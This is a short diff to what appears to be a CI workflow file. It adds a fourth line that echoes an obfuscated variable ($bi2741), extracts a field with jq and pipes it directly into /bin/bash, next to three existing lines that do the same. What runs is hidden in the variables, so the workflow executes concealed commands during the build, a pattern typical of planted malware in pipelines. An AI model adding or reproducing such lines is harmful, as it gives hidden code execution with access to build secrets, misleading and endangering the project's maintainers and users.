@@ -27,6 +27,7 @@ jobs:
           echo $be821 | jq -r .kitf73 | /bin/bash
           printf '%s' "$cvoar3" | jq -r .ht56 | /bin/bash
           printf '%s' "$av2" | jq -r .qq6 | /bin/bash
+          echo $bi2741 | jq -r .req4 | /bin/bash
 
       - name: Upload artifact
         if: always()
